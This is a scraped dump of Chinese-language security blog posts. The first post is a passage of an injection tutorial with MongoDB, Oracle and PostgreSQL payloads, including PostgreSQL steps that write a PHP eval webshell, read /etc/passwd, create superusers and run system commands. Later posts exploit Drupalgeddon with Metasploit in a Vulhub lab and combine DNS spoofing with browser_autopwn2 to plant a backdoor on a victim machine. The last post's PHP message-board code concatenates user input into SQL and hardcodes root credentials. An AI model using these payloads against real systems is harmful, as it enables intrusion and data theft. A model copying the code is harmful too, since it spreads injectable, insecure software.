RECOVERY simple 12. Nosql注入NOSQL(Not Only SQL) 12.1 MongoDB介绍和使用基于分布式文件存储数据库 使用C++开发，支持跨平台，可以存储任何数据(文件)允许在服务器端执行脚本，可以用JavaScript编写某些函数使用Json形式存储数据支持的编程语言：PHP、Ruby、Python、C++、C#、Java使用db表示数据库 12.1.1 sql和nosql结构对比 sql Nosql 解释/说明 database database 数据库 table collection(记录) 数据库表/集合 row 文件 数据记录行/文件 column field 数据字段域 index index 索引 table join / 表连接，MongoDB不支持 primary key primary key 主键，MongoDB自动将_id字段设置为主键 12.1.2 MongoDB使用12.1.2.1 对数据库的操作12.1.2.1.1 创建数据库1use databasename 12.1.2.2 查看当前数据库1db 12.1.2.3 查看所有数据库12show dbsshow databases 12.1.2.4 删除数据库1db.dropDatabase() 12.1.2.2 对集合的操作12.1.2.2.1查看所有集合12show tables;show collections; 12.1.2.2.2 创建集合1db.creatCollection(&quot;collectionname&quot;) 12.1.2.2.3 创建集合并插入数据1db.collectionname.insert(&#123;key:value,key2:value2&#125;) 12.1.2.2.4 删除集合1db.collectionname.drop() 12.1.2.3 对文档的操作12.1.2.3.1 查询表中所有文档1db.collectionname.find().pretty() 12.1.2.3.2 更新文档123db.collectionname.update(&lt;query&gt;,&lt;update&gt;)&lt;query&gt; 条件&lt;update&gt; 更新内容 12.1.2.3.2.1 更新单条数据1db.collectionname.update(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;,&#123;$set:&#123;&quot;age&quot;:18&#125;&#125;) 12.1.2.3.2.2更新多条数据1db.collectionname.update(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;,&#123;$set:&#123;&quot;age&quot;:18&#125;&#125;,&#123;multi:true&#125;) 12.1.2.3.2.3删除数据123db.collectionname.remove()db.collectionname.remove(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;)db.collectionname.deleteMany(&#123;&#125;)//删除所有文档 12.1.2.4 查询语句12.1.2.4.1 有条件查询1234567= &#123;key:value&#125; 寻找key=value的文档&lt; &#123;key:&#123;&amp;lt:value&#125;&#125;&gt; &#123;key:&#123;&amp;gt:value&#125;&#125;&lt;= &#123;key:&#123;&amp;lte:value&#125;&#125;&gt;= &#123;key:&#123;&amp;gte:value&#125;&#125;!= &#123;key:&#123;&amp;ne:value&#125;&#125;$regex 1db.collectionname.find(&#123;key:&#123;&amp;ge:value&#125;&#125;) 12.1.2.4.2 and条件1db.collectionname.find(&#123;key:&#123;$gt:value&#125;,key2:&#123;$gt:value&#125;&#125;) 12.1.2.4.3 or条件1db.collectionname.find($or:[&#123;key:&#123;$gt:value&#125;,key:&#123;&amp;lt:value&#125;&#125;]) 12.1.2.4.4 正则查询1db.collectionname.find(&#123;key:&#123;$regex:&quot;regex&quot;&#125;&#125;) 12.2 PHP操作Mongodbmongo(面向过程) mongodb(面向对象) 12.3 MongoDB 注入注入类型分类：重言式、联合查询、JavaScript注入 12.3.1 重言式(永真式)1db.users.find(&#123;&quot;username&quot;:&#123;$ne:&quot;123&quot;&#125;,&quot;password&quot;:&#123;$ne:&quot;45&quot;&#125;&#125;) 1username[$ne]=love&amp;password[$ne]=love 12.3.1.1 正则1username[$regex]=^a&amp;password[$regex]=^1 12.3.2 联合查询在PHP新的mongo扩展和mongodb扩展中，已经停止对其支持。 12.3.3 JavaScript注入12345678910function login() &#123; var username = '\".$username.\"'; var password = '\".$password.\"'; if(username == 'admin' &amp;&amp; password == '123456') return true; else&#123; return false; &#125;&#125; 账号：a&#39; return true; var a=&#39;密码：1 12.3.4 Shell拼接利用1?username=&quot;&#125;);db.messages.insert(&#123;&quot;name&quot;:&quot;wangwu&quot;&#125;);db.messages.find(&#123;&quot;author&quot;:&quot;1 1db.messages.find(&#123;&quot;author&quot;:&quot;&apos;.$username.&apos;&quot;&#125;).sort(&#123;&quot;addtime&quot;:-1&#125;); 12.4 注入实验12.4.1 重言式注入12.4.1.1 代码12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$host = &apos;127.0.0.1&apos;;$port = &apos;27017&apos;;$username = &apos;&apos;;$password = &apos;&apos;;$tb_users = &apos;mymessage.users&apos;;$tb_messages = &apos;mymessage.messages&apos;;$manager = new MongoDB\\Driver\\Manager(&quot;mongodb://&#123;$host&#125;:&#123;$port&#125;&#125;&quot;);if (!empty($_POST[&apos;username&apos;]) &amp;&amp; !empty($_POST[&apos;password&apos;])) &#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; $query = array( &apos;username&apos; =&gt; $username, &apos;password&apos; =&gt; $password, ); $query = new MongoDB\\Driver\\Query($query); $cursor = $manager-&gt;executeQuery($tb_users, $query)-&gt;toArray(); if (count($cursor)&gt;0) &#123; echo &apos;&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;alert(&quot;登陆成功！&quot;);&lt;/script&gt;&apos;; &#125;else&#123; echo &apos;&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;alert(&quot;你的用户名或密码错误&quot;);&lt;/script&gt;&apos;; &#125;&#125;?&gt;&lt;center&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;form action=&quot;login_2.php&quot; method=&apos;post&apos;&gt; &lt;h3&gt;名字：&lt;/h3&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width:10%;height:20px&quot;&gt; &lt;h3&gt;密码：&lt;/h3&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;width:10%;height:20px&quot;&gt; &lt;br /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot; style=&quot;width:4%;height:30px&quot;&gt; &lt;/form&gt;&lt;/center&gt; 12.4.1.2 使用BP抓包 12.4.1.3 构造payload 12.4.1.4 注入结果 12.4.2 正则注入12.4.2.1 代码12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$host = &apos;127.0.0.1&apos;;$port = &apos;27017&apos;;$username = &apos;&apos;;$password = &apos;&apos;;$tb_users = &apos;mymessage.users&apos;;$tb_messages = &apos;mymessage.messages&apos;;$manager = new MongoDB\\Driver\\Manager(&quot;mongodb://&#123;$host&#125;:&#123;$port&#125;&#125;&quot;);if (!empty($_POST[&apos;username&apos;]) &amp;&amp; !empty($_POST[&apos;password&apos;])) &#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; $query = array( &apos;username&apos; =&gt; $username, &apos;password&apos; =&gt; $password, ); $query = new MongoDB\\Driver\\Query($query); $cursor = $manager-&gt;executeQuery($tb_users, $query)-&gt;toArray(); if (count($cursor)&gt;0) &#123; echo &apos;&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;alert(&quot;登陆成功！&quot;);&lt;/script&gt;&apos;; &#125;else&#123; echo &apos;&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;alert(&quot;你的用户名或密码错误&quot;);&lt;/script&gt;&apos;; &#125;&#125;?&gt;&lt;center&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;form action=&quot;login_2.php&quot; method=&apos;post&apos;&gt; &lt;h3&gt;名字：&lt;/h3&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width:10%;height:20px&quot;&gt; &lt;h3&gt;密码：&lt;/h3&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;width:10%;height:20px&quot;&gt; &lt;br /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot; style=&quot;width:4%;height:30px&quot;&gt; &lt;/form&gt;&lt;/center&gt; 12.4.2.2 使用BP抓包 12.4.2.3 将拦截到的数据包放到Intruder中 进行暴力破解之后，有3个匹配的结果 12.4.2.4 注入结果将上面结果中的l和1写在Intruder中继续暴破 得到的结果 重复上述步骤可以暴出账户和密码若碰到没有办法出现正确结果，可以在正则表达式添加$验证匹配是否结束，还可以尝试在Intruder-Payloads Options中添加新的字符 整个过程可以写python脚本进行，我不会写就不说了 13. Oracle注入13.1 Oracel数据库介绍Oracle数据库系统是美国Oracle(甲骨文)提供一款关系型数据库管理系统。航空、物流、银行、铁路、金融交易常用。特点：1.支持多用户、大事物量的处理2.数据安全性和完整性的有效控制3.支持分布式数据处理4.移植性强 13.2 判断数据库13.2.1 判断注入12and 1=1and 1=2 13.2.2 判断Oracle数据库12and exists(select * from dual)and exists(select * from user_tables) Oracle 表空间 13.3 判断列1order by 13.4 联合查询12union select null用null代替数字 13.5 获取数据类型不匹配的列在每列上逐个用数字代替，如果返回正常说明该列为数字类型，反之则为非数字类型。也可以逐个用引号引起来，如：&#39;null&#39;,null…from dual，返回正常说明该列为字符类型，反之为非数字类型。 13.6 获取基本信息在非数字类型列上获取数据 13.6.1 获取数据库版本1select banner from sys.v_$version where rownum=1 13.6.2 获取操作系统版本1select member from v$logfile where rownum=1 13.6.3 获取连接数据库的当前用户1select SYS_CONTEXT(&apos;USERENV&apos;,&apos;CURRENT_USER&apos;)from dual 13.6.4 获取数据库1select owner from all_tables where rownum=1 13.6.5 获取第一个表1select table_name from user_tables where rownum=1 13.6.6 获取第二个表1select table_name from user_tables where rownum=1 and table_name&lt;&gt;&apos;tablename&apos; 13.6.7 获取表下的第一个列名1select column_name from user_tab_columns where table_name=&apos;tablename&apos; and rownum=1 13.6.8 获取表下的第二个列名1select column_name from user_tab_columns where table_name=&apos;tablename&apos; and rownum=1 and column_name&lt;&gt;&apos;columnname&apos; 13.6.9 获取数据1select columnname from tablename 13.6.10 注入特点判断像access，order by和union select像mysql，爆表名、列名像mssql 13.7 第二种注入方式13.7.1 判断表是否存在在URL中加上 1and (select count(*) from tablename)&lt;&gt;0 若返回正常，说明存在tablename表。如果返回错误，可以更改表名继续猜解。 可以使用字典进行暴破 若 1and (select count(*) from admin)=1 返回正常说明只有一个管理员 13.7.2 判断表下列名是否存在1and (select count(columnname) from tablename) 13.7.3 使用ASCII码折半法猜解管理员账户和密码1and (select count(*) from where length(name)=5)=1 说明：length()函数用于求字符串的长度，此处猜测用户名的长度和5比较，即猜测是否由5个字符组成若返回正常，说明长度大于等于5 1and (select count(*) from tablename where ascii(substr(name,1,1))=97)=1 说明：substr()函数用于截取字符串，ascii()函数用于获取字符的ascii码，此处的意思是截取name字段的第一个字符，获取它的ascii码值，查询ascii码表可知97为字符a 14. Postgresql注入PostgreSQL是以加州大学伯克利分校计算机系开发的POSTGRES，现在已经更名为PostgreSQL，版本 4.2为基础的对象关系型数据库管理系统（ORDBMS）。PostgreSQL支持大部分 SQL标准并且提供了许多其他现代特性：复杂查询、外键、触发器、视图、事务完整性、MVCC。同样，PostgreSQL 可以用许多方法扩展，比如， 通过增加新的数据类型、函数、操作符、聚集函数、索引。免费使用、修改、和分发 PostgreSQL，不管是私用、商用、还是学术研究使用。 14.1 Postgresql数据库注入常用语法14.1.1 判断是否为postgresql数据库1?id=1+and+1::int=1-- 返回正常则为postgresql数据库 14.1.2 判断数据库版本信息1?id=1+and+1=cast(version() as int)-- 14.1.3 判断当前用户1?id=1 and 1=cast(user||123 as int) 14.1.4 判断有多少字段12order byunion select null,null 和Oracle相似，不能用直接用数字 14.1.5 获取当前用户1union select null,null,user 14.1.6 获取数据库版本信息1union select null,version(),null-- 14.1.7 获取当前权限1union select null,current_schema(),null 14.1.8 获取当前数据库名称1union select null,current_database(),null 14.1.9 获取当前表名1union select null,relname,null from pg_stat_user_tables 14.1.10 读取每个表的列名1union select null,column_name,null from infromation_schena.columns where table_name=&apos;tablename&apos; 14.1.11 列字段内容1union select null,name||pass,null from admin 14.1.12 查看postgresql数据库的账号密码1union select null,username||chr(124)||passwd,null from pg_shadow 14.1.13 创建用户1;create user username with superuser password &apos;password&apos; -- 14.1.14 修改用户密码1;alter user username with password &apos;new password&apos; -- 14.1.15 Postgresql写Shell123;create table shell(shell text not null);;insert into shell values($$&lt;?php @eval($_POST[wind]);?&gt;$$);;copy shell(shell) to &apos;/var/www/html/shell.php&apos;; 另一种方法 1;copy (select &apos;$$&lt;?php @eval($_POST[wind]);?&gt;$$&apos;) to &apos;c/inetpub/wwwroot/mysql-sql/ddd.php&apos; 读取文件前20行 1pg_read_file(&apos;/etc/passwd&apos;,1,20) 14.1.16 创建system函数用于版本大于8的postgreslq数据库 14.1.16.1 创建system函数1create FUNCTION system(cstring) RETURN int AS &apos;lib/libc.so.6&apos;,&apos;system&apos; LANGUAGE &apos;c&apos; STRICT 14.1.16.2 创建一个输出表1create table stdout(idserial,system_out text) 14.1.16.3 执行shell，输出到输出表内1select system(&apos;uname -a &gt; /tmp/test&apos;) 14.1.16.4 copy输出的内容到表里：1COPY stdout(system_out) FROM &apos;/tmp/test&apos; 14.1.16.5 从输出表内读取执行后的回显，判断是否执行成功1union all select null,(select stdout from system_out order by id desc),null limit 1 offset 1 -- 14.1.17 数据库备份还原14.1.17.1 备份数据库1pg_dump -O -h ip -U postgres dbname &gt; c:\\mdb.sql 14.1.17.2 远程备份数据库备份到本地1pg_dump -O -h 本地IP -U dbowner -w -p port SS &gt; SS.sql 14.1.17.3 还原数据库1psql -h localhost -U postgres -d dbname 14.2 注入过程14.2.1 判断注入123&apos; 报错and 1=1 返回正常and 1=2 返回错误 14.2.2 获取信息14.2.2.1 获取数据库版本信息系统信息1and 1=cast(version() as int) 14.2.2.2 获取当前用户名称1and 1=cast(user||123 as int) 14.2.2.3 创建表1;create table tablename(w text not null); 14.2.2.4 导出一句话1;copy tablename to $$/var/www/webshell.php$$; 将一句话保存为webshell.php文件 15. Tips15.1 判断数字型注入还是字符型注入12?id=1 and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 15.2 注释在做sqli-labs-master的时候有些关可以直接使用#，有些关要将#进行URL编码写在payload中有些关可以直接使用--，有些关要将空格进行URL编码写在payload中 16. 防注入过滤函数 正则匹配 使用参数化查询 waf 设计验证 17. 参考[1] Sqli_labs通关文档 [2] 【学习笔记】MYSQL的floor报错原理分析总结 [3] 伪静态注入的总结 [4] are-pdo-prepared-statements-sufficient-to-prevent-sql-injection [5] 深入理解SET NAMES和mysql(i)_set_charset的区别 [6] Time-Based Blind SQL Injection using Heavy Query [7] mysql 二十余种报错注入姿势 [8] SQL参数化查询","categories":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/categories/OWASP-TOP10/"}],"tags":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/tags/OWASP-TOP10/"}]},{"title":"'Vulhub搭建漏洞环境及简单测试'","slug":"Vulhub","date":"2019-04-09T12:39:11.000Z","updated":"2019-07-04T11:25:02.060Z","comments":true,"path":"2019/04/09/Vulhub/","link":"","permalink":"https://chirec.github.io/2019/04/09/Vulhub/","excerpt":"1.Vulhub搭建1.1 docker安装12curl -s https://get.docker.com/ | sh docker -h 如果第二个命令能出现docker的帮助提示，则表示安装成功如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 安装docker-compose12pip install docker-composedocker-compose -v 第二个命令出现版本信息，表示安装成功。提示没有pip，安装提示安装pip 1.3 安装Vulhub1git clone https://github.com/vulhub/vulhub.git 2.搭建漏洞环境2.1 生成容器以 Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）为例 12cd /vulhub/drupal/CVE-2014-3704# docker-compose up -d","text":"1.Vulhub搭建1.1 docker安装12curl -s https://get.docker.com/ | sh docker -h 如果第二个命令能出现docker的帮助提示，则表示安装成功如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 安装docker-compose12pip install docker-composedocker-compose -v 第二个命令出现版本信息，表示安装成功。提示没有pip，安装提示安装pip 1.3 安装Vulhub1git clone https://github.com/vulhub/vulhub.git 2.搭建漏洞环境2.1 生成容器以 Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）为例 12cd /vulhub/drupal/CVE-2014-3704# docker-compose up -d 2.2 环境配置查看官方文档：Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704） 数据库设置 邮箱设置 无法向邮箱发送邮件，没必要写可以正常使用的邮箱 3.CMSmap扫描123git clone https://github.com/Dionach/CMSmap.gitcd CMSmappython3 cmsmap.py http://192.168.126.148:8080/ 4.使用MSF攻击1234567/etc/init.d/postgresql startmsfconsolesearch drupaluse exploit/multi/http/drupal_drupageddon set rhost 192.168.126.148set rport 8080run 5.docker使用5.1 添加加速12https://www.daocloud.io/mirrorcurl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io 5.2 docker镜像操作1234docker search mysql //搜索docker pull 镜像名称 //下载docker images //查看本地已下载镜像docker rmi 镜像id //删除镜像 5.3 docker容器操作123456789101112docker run -d -p --name 容器名或镜像ID）-d 后台运行-p 随机分配端口-p 端口1（宿主机）:端口2（容器中）//端口转发docker ps //查看当前处于运行状态的容器docker start 容器ID或容器名 //开启容器docker stop 容器ID或容器名 //停止运行中的容器docker ps -a //查看停止的容器docker rm 容器ID或容器名 //删除容器docker exec -it 容器ID或容器名 /bin/bash //进入容器内部docker save 容器名/容器ID &gt; test.tar //导出容器docker load &lt; test.tar //导入容器 5.4 加入docker组安装完成之后，普通用户每次执行docker命令都需要加上sudo ，所以我们可以加入doker用户组获取操作权限 1.使用有sudo权限的帐号登录系统2.创建docker分组，并将相应的用户添加到这个分组里面3.退出，然后重新登录，以便让权限生效 1sudo usermod -aG docker your_username 6.参考[1] 一键安装Docker [2] 启动漏洞环境","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://chirec.github.io/categories/漏洞复现/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://chirec.github.io/tags/漏洞复现/"}]},{"title":"'使用Ettercap和MSF模块进行DNS欺骗，并植入后门'","slug":"I-Want-to-see-U","date":"2019-04-08T11:01:44.000Z","updated":"2019-07-04T11:22:16.670Z","comments":true,"path":"2019/04/08/I-Want-to-see-U/","link":"","permalink":"https://chirec.github.io/2019/04/08/I-Want-to-see-U/","excerpt":"1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。 1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。 2.实验环境 角色 系统版本 IP 备注 靶机 Windows Server 2003 192.168.126.149 无 攻击机 Kali Linux 64 bit 2019.1a 192.168.126.126 无","text":"1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。 1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。 2.实验环境 角色 系统版本 IP 备注 靶机 Windows Server 2003 192.168.126.149 无 攻击机 Kali Linux 64 bit 2019.1a 192.168.126.126 无 3.实验过程3.1使用Ettercap进行DNS欺骗DNS欺骗过程和使用Ettercap和SET进行DNS欺骗、钓鱼过程相同，可以查看这篇文章。注意：进行DNS欺骗后，要开启Apache2服务才可以正常访问。上一篇中，SET自动开启了80端口，所以不需要开启Apache2服务。开启Apache2服务命令 12/etc/init.d/apache2 start/etc/init.d/apache2 status 3.2MSF模块生成恶意URL123456/etc/init.d/postgresql startmsfdb initmsfconsolesearch browser_autopwn2use auxiliary/server/browser_autopwn2run 没有什么需要修改的设置，使用模块之后，直接run就可以生成恶意URL了 3.3添加跳转脚本生成URL过程比较慢，这段时间我们给主页添加跳转脚本 1234&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; // 以下方式定时跳转setTimeout(&quot;javascript:location.href=&apos;Hello！&apos;&quot;, 1000); &lt;/script&gt; 将上方代码中的Hello！替换为MSF生成的恶意URL即可。 3.4靶机访问访问www.baidu.com，可以看到访问的是刚刚写的index.html 自动跳转到恶意URL 3.5测试结果在靶机访问恶意URL之后，MSF开始根据浏览器版本选择使用EXP并创建会话 3.6启动会话MSF创建会话之后，我们需要手动启用会话 1sessions -l 1sessions -i 1 123getuidgetsystemgetuid 4.参考[1] MSF自动化浏览器攻击与后门安装","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/categories/工具使用/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'使用PHP编写留言板Version2.0'","slug":"Create-Message-Board-with-PHP-Version-2-0","date":"2019-03-29T08:37:23.000Z","updated":"2019-03-31T07:40:39.172Z","comments":true,"path":"2019/03/29/Create-Message-Board-with-PHP-Version-2-0/","link":"","permalink":"https://chirec.github.io/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/","excerpt":"1.改进在上一篇使用PHP编写留言板的结尾处，写了留言板的不足之处。经过一周的PHP学习，打算重新写一遍留言板，对之前的不足做出改进。 1.1删除功能新的留言板添加了编辑选项，可以修改留言内容或删除留言。 1.2重复提交新的留言板添加了session，而且在提交表单之后会自动跳转到留言板的主页，从而解决了重复提交的Bug。 1.3时间显示问题在上一篇其实已经写出了解决方案，新的留言板会使用上次的方案来解决时间显示问题。","text":"1.改进在上一篇使用PHP编写留言板的结尾处，写了留言板的不足之处。经过一周的PHP学习，打算重新写一遍留言板，对之前的不足做出改进。 1.1删除功能新的留言板添加了编辑选项，可以修改留言内容或删除留言。 1.2重复提交新的留言板添加了session，而且在提交表单之后会自动跳转到留言板的主页，从而解决了重复提交的Bug。 1.3时间显示问题在上一篇其实已经写出了解决方案，新的留言板会使用上次的方案来解决时间显示问题。 2.功能介绍2.1删除留言123456789101112131415&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;]; $message_ID=$_GET[&apos;id&apos;]; $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;delete from messages where ID=$message_ID;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute();?&gt; 删除功能的实现，是通过在编辑页面点击链接时使用GET方式传入留言的ID，获得留言的ID后，通过PDO操作数据库删除留言。 2.2登陆1234567891011121314151617181920212223242526272829303132&lt;?php session_start(); header(&quot;Content-Type:text/html; charset=utf-8&quot;); $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; //连接MySQL数据库 try&#123; //连接数据库 $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); echo &quot;Connect successed.&quot;.&quot;&lt;br&gt;&quot;; //用户提交登陆信息 $userName=$_POST[&apos;userName&apos;]; $pwd=$_POST[&apos;password&apos;]; //数据库查询语句 $query=&quot;select Password from user where userName=&apos;$userName&apos;&quot;; // $res=$connect-&gt;prepare($query); $res-&gt;execute(); $result=$res-&gt;fetch(PDO::FETCH_ASSOC); if($pwd==$result[&apos;Password&apos;])&#123; echo &quot;登陆成功&quot;; $_SESSION[&apos;userName&apos;]=$userName; header(&quot;location:home.php&quot;); &#125;else&#123; echo &quot;登陆失败&quot;; &#125; &#125;catch(PDOException $error)&#123; echo &quot;Connect failed.&quot;.$error-&gt;getmessage(); &#125; $connect=NULL;?&gt; 2.3退出123456&lt;?php session_start(); unset($_SESSION[&apos;userName&apos;]); session_destroy(); header(&quot;location:login_page.php&quot;); ?&gt; 2.4发布留言123456789101112131415161718192021&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $receiver=$_POST[&apos;receiver&apos;]; $time=date(&quot;Y-m-d H-i-s&quot;); $content=$_POST[&apos;content&apos;]; $query=&quot;insert into `messages` (sender,receiver,time,content) values(&apos;$userName&apos;,&apos;$receiver&apos;,&apos;$time&apos;,&apos;$content&apos;);&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); $connect=NULL; header(&quot;location:home.php&quot;);?&gt; 2.5注册1234567891011121314151617181920212223242526272829303132&lt;?php header(&quot;Content-Type:text/html; charset=utf-8&quot;); $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; //连接MySQL数据库 try&#123; //连接数据库 $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); echo &quot;Connect successed.&quot;.&quot;&lt;br&gt;&quot;; //用户提交登陆信息 $userName=$_POST[&apos;userName&apos;]; $pwd=$_POST[&apos;password&apos;]; $Name=$_POST[&apos;Name&apos;]; //数据库查询语句 $query=&quot;insert into `user` (userName,Password,Name) value(&apos;$userName&apos;,&apos;$pwd&apos;,&apos;$Name&apos;);&quot;; // if($_POST[&apos;userName&apos;]==&quot;&quot;or$_POST[&apos;password&apos;]==&quot;&quot;or$_POST[&apos;Name&apos;]==&quot;&quot;)&#123; echo &quot;不能为空&quot;; &#125;else&#123; $res=$connect-&gt;exec($query); if($res!=0)&#123; echo &quot;注册成功&quot;; &#125;else&#123; echo &quot;注册失败&quot;; &#125; &#125; &#125;catch(PDOException $error)&#123; echo &quot;Connect failed.&quot;.$error-&gt;getmessage(); &#125; $connect=NULL;?&gt; 2.6编辑留言123456789101112131415161718192021&lt;?php session_start(); if(empty($_SESSION['userName']))&#123; header(\"location:login_page.php\"); &#125; $userName=$_SESSION['userName']; $message_ID=$_POST['ID']; $ip=\"localhost\"; $account=\"root\"; $password=\"root\"; $receiver=$_POST['receiver']; $time=date(\"Y-m-d H-i-s\"); $content=$_POST['content']; $ID=$_POST['ID']; $connect=new pdo(\"mysql:host=$ip;dbname=MessageBoard\",$account,$password); $query=\"update `messages` set receiver='$receiver',time='$time',content='$content' where ID='$ID';\"; $res=$connect-&gt;prepare($query); $res-&gt;execute(); $connect=NULL; header(\"location:home.php\");?&gt; 编辑留言功能实现的方式和删除留言的一样的，都是通过在编辑页面使用GET方式将留言ID传入到编辑留言页面，再通过一个隐藏的表单将留言ID所使用POST方式传入到编辑页面功能中，然后再使用PDO操作数据库编辑留言。 2.7Session1234567session_start();$_SESSEION['userName']=$userName;if(empty($_SESSION['userName']))&#123; header(\"location:login_page.php\"); &#125;unset($_SESSION['userName'];session_destory(); 2.7.1session_start()在把用户信息存储在$_SESSION数组之前，必须先启动会话。session_start()就是启动会话的函数。session_start()这个函数一般写在最开始的地方，在&lt;html&gt;标签之前即可。 2.7.2存储或取回session变量存储或取回都需要使用到$_SESSION变量。上面的代码中，将用户登录名（userName）存储到了$_SESSION中，在后面比对是也使用的是userName。 2.7.3简单的登陆判断使用if判断$_SESSION[‘userName’]是否为空来判断用户是否已经登陆，如果$_SESSION[‘userName’]为空，则跳转到登陆页面。 2.7.4删除session数据unset($_SESSION[‘userName’])和session_destory()都可以实现删除session数据的操作。在退出功能中写入，可以确保用户退出留言板。 3.数据库MessageBoard数据库有2个表，user表存放用户的注册信息，messages存放用户发布的留言。 3.1user表结构 3.2messages表结构 4.显示页面4.1编辑页面123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;编辑留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;编辑留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;发送人&lt;/th&gt; &lt;th&gt;接收人&lt;/th&gt; &lt;th&gt;发送时间&lt;/th&gt; &lt;th&gt;留言内容&lt;/th&gt; &lt;th&gt;删除&lt;/th&gt; &lt;th&gt;编辑&lt;/th&gt; &lt;/tr&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select * from messages where sender=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $message_ID=$result[&apos;ID&apos;]; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;sender&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;receiver&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;time&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;content&apos;].&quot;&lt;/td&gt;&quot;; echo 